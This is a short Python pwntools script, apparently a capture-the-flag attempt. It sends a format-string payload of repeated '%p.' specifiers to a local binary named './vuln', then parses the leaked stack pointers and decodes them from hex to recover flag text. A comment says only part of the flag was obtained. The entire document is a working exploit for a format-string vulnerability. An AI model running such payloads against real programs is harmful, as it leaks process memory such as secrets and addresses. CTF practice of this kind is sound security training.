"""
attempt to dump pointer from the vulnerable program...
but only part of the flag was shown.
"""
import pwn


payload: bytes = (14*"%p.").encode("utf-8")

proc = pwn.process("./vuln")

proc.recvuntil(b"ou:")
proc.sendline(payload)


output: str = proc.recvuntil(b"ye!").decode().strip()
output: str = output.replace("Here's your order: ", "", -1)\
                    .replace("Bye!", "", -1)\
                    .replace("\n", "", -1)

output: str = output.split(sep=".", maxsplit=-1)

for word in output:

    word = word[2::].replace("il)", "", -1)

    if word != '' and word != "il)":
        try:
            print(f"{word}  =  {bytes.fromhex(word).decode('utf-8', errors='ignore')}")
        except Exception:
            pass
    continue

proc.close()
